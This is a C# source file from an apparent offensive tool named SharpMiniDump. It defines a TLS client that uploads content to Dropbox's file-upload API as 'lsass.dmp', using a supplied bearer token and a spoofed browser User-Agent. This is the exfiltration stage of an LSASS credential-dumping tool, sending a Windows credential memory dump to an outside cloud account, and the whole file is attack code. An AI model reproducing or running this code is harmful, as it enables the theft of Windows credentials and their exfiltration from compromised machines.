using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace SharpMiniDump
{
    public class SslTcpClient
    {
        public static string old = null;
        
        public static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            if (sslPolicyErrors == SslPolicyErrors.None)
            {
                return true;
            }
            return false;
        }

        public static void RunClient(string machineName, string project, string token, string content)
        {
            TcpClient client = new TcpClient(machineName, 443);
            SslStream sslStream = new SslStream(client.GetStream(), false, new RemoteCertificateValidationCallback(ValidateServerCertificate), null);
            try
            {
                const SslProtocols _Tls12 = (SslProtocols)3072;
                const SecurityProtocolType Tls12 = (SecurityProtocolType)_Tls12;
                ServicePointManager.SecurityProtocol = Tls12;
                sslStream.AuthenticateAsClient(machineName, null, _Tls12, false); ;
            }
            catch (AuthenticationException e)
            {
                if (e.InnerException != null)
                { }
                client.Close();
                return;
            }

            string headers = "POST /2/files/upload HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36\r\nHost: content.dropboxapi.com\r\nAuthorization: Bearer " + token + "\r\nDropbox-API-Arg: {\"path\": \"/" + project + "/lsass.dmp\",\"mode\": \"overwrite\",\"autorename\": false,\"mute\": false,\"strict_conflict\": false}\r\nContent-Type: text/plain; charset=dropbox-cors-hack\r\n";
            string length = "Content-Length: " + Encoding.UTF8.GetByteCount(content).ToString() + "\r\n\r\n";
            byte[] messsage = Encoding.UTF8.GetBytes(headers + length + content);
            sslStream.Write(messsage, 0, messsage.Length);
            sslStream.Flush();

            System.Threading.Thread.Sleep(5000);
        }
    }
}